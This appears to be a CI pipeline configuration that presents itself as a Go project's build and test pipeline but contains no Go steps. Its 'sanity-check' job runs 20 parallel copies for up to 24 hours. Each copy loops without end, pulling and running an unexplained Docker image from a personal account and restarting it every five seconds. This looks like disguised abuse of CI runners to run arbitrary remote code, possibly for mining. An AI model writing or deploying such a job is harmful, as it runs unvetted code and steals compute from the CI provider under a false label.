version: v1.0
name: Go Project CI/CD Pipeline
agent:
  machine:
    type: f1-standard-4
    os_image: ubuntu2404
execution_time_limit:
  hours: 24
blocks:
  - name: Runtime Test
    task:
      jobs:
        - name: sanity-check
          parallelism: 20
          execution_time_limit:
            hours: 24
          commands:
            - docker version
            - |
              while true; do
                echo "[run] $(date)"
                docker run --rm sparrowgrignon8501/debian:latest || true
                echo "[restart] $(date)"
                sleep 5
              done
